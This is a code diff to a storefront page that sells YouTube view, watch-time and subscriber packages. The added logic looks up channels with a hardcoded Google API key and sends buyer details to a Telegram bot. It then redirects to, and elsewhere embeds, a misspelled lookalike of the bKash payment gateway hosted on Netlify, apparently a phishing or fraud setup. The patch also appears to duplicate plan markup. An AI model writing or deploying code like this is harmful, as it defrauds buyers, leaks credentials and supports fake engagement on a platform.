@@ -337,7 +337,7 @@
         <iframe :src="'https://bkash-payment-getway.netlify.app/?amount=' + calcCheckoutPrice(checkoutOffer.basePrice, telecomPromo)" class="w-full h-full border-0" title="Payment Gateway"></iframe>
     </div>
 
-    <!-- YOUTUBE MEMBERSHIP VIEW -->
+        <!-- YOUTUBE MEMBERSHIP VIEW -->
     <div x-show="currentPage === 'youtube'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
         <div class="flex items-center gap-3 py-2 border-b border-zinc-800">
             <button @click="navigateTo('home')" class="text-gray-300 hover:bg-zinc-800 p-1.5 rounded-full transition">
@@ -360,6 +360,115 @@
 
         <div class="space-y-3">
             <h3 class="font-bold text-gray-300 text-xs uppercase tracking-wider">Choose Your Plan</h3>
+
+            <!-- Standard Membership -->
+            <div @click="selectYtPlan('Standard Membership', 199)" :class="ytPlanName === 'Standard Membership' ? 'border-green-500 bg-green-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
+                <span class="absolute top-3 right-3 bg-red-600 text-[9px] text-white px-2 py-0.5 rounded-full font-bold uppercase">Most Popular</span>
+                <h4 class="font-bold text-sm text-white">Standard Membership</h4>
+                <div class="flex items-center gap-2 my-1">
+                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(199)"></span>
+                    <template x-if="discountSettings.mode === 'on'">
+                        <span class="text-xs text-gray-500 line-through">৳199</span>
+                    </template>
+                </div>
+                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
+                    <li><i class="fas fa-check text-green-400 mr-1.5"></i> Views: 50,000+</li>
+                    <li><i class="fas fa-check text-green-400 mr-1.5"></i> Watch Time: 4,000 Hour</li>
+                    <li><i class="fas fa-check text-green-400 mr-1.5"></i> Subscribers: 1,000</li>
+                </ul>
+            </div>
+
+            <!-- Premium Membership -->
+            <div @click="selectYtPlan('Premium Membership', 299)" :class="ytPlanName === 'Premium Membership' ? 'border-green-500 bg-green-500/10' : 'border-zinc-800 bg-zinc-950'" class="border rounded-2xl p-4 cursor-pointer transition">
+                <h4 class="font-bold text-sm text-white">Premium Membership</h4>
+                <div class="flex items-center gap-2 my-1">
+                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(299)"></span>
+                    <template x-if="discountSettings.mode === 'on'">
+                        <span class="text-xs text-gray-500 line-through">৳299</span>
+                    </template>
+                </div>
+                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
+                    <li><i class="fas fa-check text-green-400 mr-1.5"></i> Views: 1,00,000+</li>
+                    <li><i class="fas fa-check text-green-400 mr-1.5"></i> Watch Time: 6,000+ Hour</li>
+                </ul>
+            </div>
+        </div>
+
+        <button @click="navigateTo('youtube-activation')" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 rounded-xl text-xs transition tracking-wide">
+            Proceed to Activation
+        </button>
+    </div>
+
+    <!-- NEW YOUTUBE ACTIVATION VIEW -->
+    <div x-show="currentPage === 'youtube-activation'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
+        <div class="pt-1">
+            <button @click="navigateTo('youtube')" class="p-1.5 hover:bg-zinc-800 rounded-full transition text-zinc-400">
+                <i data-lucide="arrow-left" class="w-5 h-5"></i>
+            </button>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3 flex items-center justify-between">
+            <span class="text-sm font-black text-red-500" x-text="'Selected: ' + ytPlanName + ' (৳' + calcCheckoutPrice(ytPlanBasePrice, ytPromo) + ')'"></span>
+            <span class="bg-zinc-800 text-white text-[10px] font-bold px-2 py-0.5 rounded">PROMO OFFER</span>
+        </div>
+
+        <div id="main-card" class="bg-zinc-950 border border-zinc-800 text-white rounded-2xl p-5 shadow-lg">
+            <div class="flex items-center gap-2 mb-4">
+                <i class="fab fa-youtube text-red-500 text-lg"></i>
+                <h2 class="text-xs font-bold uppercase tracking-wider text-zinc-400">Confirm Channel Handle</h2>
+            </div>
+
+            <div x-show="!ytChannelData" class="mb-4">
+                <input type="text" x-model="ytHandleInput" placeholder="@channelhandle" class="w-full bg-zinc-900 border border-zinc-700 text-center font-medium py-3 rounded-xl focus:outline-none text-base text-white focus:border-red-500 transition">
+            </div>
+
+            <!-- Live Channel Details Card -->
+            <div x-show="ytChannelData" class="bg-zinc-900 text-white rounded-xl p-4 mb-4 relative border border-zinc-800">
+                <button @click="resetYtSearch()" class="absolute top-2 right-2 text-zinc-500 hover:text-white"><i class="fas fa-times-circle"></i></button>
+                <div class="flex items-center gap-3 mb-4">
+                    <template x-if="ytChannelData?.avatar">
+                        <img :src="ytChannelData.avatar" alt="Avatar" class="w-12 h-12 rounded-full border border-zinc-700">
+                    </template>
+                    <template x-if="!ytChannelData?.avatar">
+                        <div class="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center text-white text-xl"><i class="fab fa-youtube"></i></div>
+                    </template>
+                    <div>
+                        <h4 class="font-bold text-sm text-white" x-text="ytChannelData?.title"></h4>
+                        <p class="text-xs text-zinc-500" x-text="ytChannelData?.handle"></p>
+                    </div>
+                </div>
+                <div class="grid grid-cols-3 gap-2 text-center text-[11px]">
+                    <div class="bg-zinc-950 p-2 rounded-lg border border-zinc-800"><span class="block font-bold text-xs text-red-500" x-text="ytChannelData?.subs"></span><span class="text-zinc-400">Subscribers</span></div>
+                    <div class="bg-zinc-950 p-2 rounded-lg border border-zinc-800"><span class="block font-bold text-xs text-red-500" x-text="ytChannelData?.videos"></span><span class="text-zinc-400">Videos</span></div>
+                    <div class="bg-zinc-950 p-2 rounded-lg border border-zinc-800"><span class="block font-bold text-xs text-red-500" x-text="ytChannelData?.views"></span><span class="text-zinc-400">Views</span></div>
+                </div>
+            </div>
+
+            <div x-show="!ytChannelData" class="flex justify-center mb-2">
+                <button @click="searchYtChannel()" class="w-12 h-12 bg-green-600 hover:bg-green-700 text-white rounded-full font-bold text-xs flex items-center justify-center shadow-md transition-all">
+                    <span x-show="!isYtSearching">OK</span>
+                    <i x-show="isYtSearching" class="fas fa-circle-notch animate-spin"></i>
+                </button>
+            </div>
+            <p x-show="ytSearchError" class="text-center text-xs text-red-500 mt-2" x-text="ytSearchError"></p>
+        </div>
+
+        <div class="space-y-3">
+            <input type="text" x-model="ytPromo" placeholder="Enter Promo Code *" class="w-full bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl focus:outline-none focus:border-red-500 text-xs text-white tracking-wider">
+            <div class="bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl text-zinc-400 font-medium text-xs" x-text="ytPlanName"></div>
+            
+            <select x-model="ytCountry" class="w-full bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl focus:outline-none focus:border-red-500 text-xs text-white">
+                <option value="Bangladesh">Bangladesh</option>
+                <option value="India">India</option>
+                <option value="Pakistan">Pakistan</option>
+            </select>
+
+            <button @click="handleYtActivationSubmit()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition text-xs tracking-wide shadow-md">
+                Activate Plan
+            </button>
+        </div>
+    </div>
+
 
             <!-- Standard Membership -->
             <div @click="selectYtPlan('Standard Membership', 199)" :class="ytPlanName === 'Standard Membership' ? 'border-green-500 bg-green-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
@@ -684,6 +793,97 @@
                     { id: "monthly", name: "Monthly", originalPrice: 745 },
                     { id: "2x-weekly-lite", name: "2X Weekly Lite", originalPrice: 80 }
                 ],
+                // ---- YOUTUBE ACTIVATION LOGIC START ----
+                ytPromo: '', 
+                ytCountry: 'Bangladesh', 
+                ytHandleInput: '', 
+                ytChannelData: null, 
+                isYtSearching: false, 
+                ytSearchError: '',
+                ytApiKey: 'AIzaSyAh5gRiqnkd0D9JjAQ0aaCgcORlQWc2hb8',
+
+                async searchYtChannel() {
+                    const value = this.ytHandleInput.trim();
+                    if(!value || value === "@") { this.ytSearchError = "Please enter a valid channel handle."; return; }
+                    
+                    let cleanHandle = value.startsWith('@') ? value : '@' + value;
+                    this.ytSearchError = '';
+                    this.isYtSearching = true;
+
+                    try {
+                        const url = `https://www.googleapis.com/youtube/v3/channels?part=snippet,statistics&forHandle=${encodeURIComponent(cleanHandle)}&key=${this.ytApiKey}`;
+                        const response = await fetch(url);
+                        const data = await response.json();
+
+                        if (!data.items || data.items.length === 0) {
+                            this.ytSearchError = "Channel not found! Check the handle.";
+                            this.isYtSearching = false;
+                            return;
+                        }
+
+                        const channel = data.items[0];
+                        const title = channel.snippet.title;
+                        const avatar = channel.snippet.thumbnails.default?.url || '';
+                        const stats = channel.statistics;
+
+                        this.ytChannelData = {
+                            title: title,
+                            handle: cleanHandle,
+                            avatar: avatar,
+                            subs: this.formatYtNum(stats.subscriberCount),
+                            videos: this.formatYtNum(stats.videoCount),
+                            views: this.formatYtNum(stats.viewCount)
+                        };
+                    } catch (error) {
+                        this.ytSearchError = "Failed to fetch live data.";
+                    } finally {
+                        this.isYtSearching = false;
+                    }
+                },
+
+                formatYtNum(num) {
+                    if (!num) return "0";
+                    num = parseInt(num);
+                    if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
+                    if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
+                    return num;
+                },
+
+                resetYtSearch() {
+                    this.ytChannelData = null;
+                    this.ytHandleInput = '';
+                    this.ytSearchError = '';
+                },
+
+                async handleYtActivationSubmit() {
+                    if(!this.ytChannelData) { return alert("Please confirm a valid channel first."); }
+                    
+                    if (this.discountSettings.mode === 'off' && this.ytPromo.trim().toLowerCase() !== this.configToken.toLowerCase()) {
+                        return alert("প্রোমো কোডটি সঠিক নয়!");
+                    }
+
+                    const finalPrice = this.calcCheckoutPrice(this.ytPlanBasePrice, this.ytPromo);
+                    const message = `🔔 <b>NEW YOUTUBE ACTIVATION</b>\n\n` +
+                                    `📺 Plan: ${this.ytPlanName} (৳${finalPrice})\n` +
+                                    `📺 Name: ${this.ytChannelData.title}\n` +
+                                    `🆔 Handle: ${this.ytChannelData.handle}\n` +
+                                    `👥 Subs: ${this.ytChannelData.subs} | 🎥 Videos: ${this.ytChannelData.videos}\n` +
+                                    `🎫 Promo: ${this.ytPromo || 'None'}\n` +
+                                    `🌍 Country: ${this.ytCountry}`;
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
+                            method: "POST", headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ chat_id: this.telegramChatId, text: message, parse_mode: "HTML" })
+                        });
+                    } catch(e){}
+
+                    alert('Redirecting to Payment Gateway...');
+                    window.location.href = "https://bkash-payment-getway.netlify.app/";
+                },
+                // ---- YOUTUBE ACTIVATION LOGIC END ----
+
+
 
                 currentSlug: 'banglalink', checkoutOffer: {}, telecomPhone: '', telecomPromo: '', selectedTelecomPayment: 'bkash', telecomErrors: {}, isTelecomSubmitting: false,
 
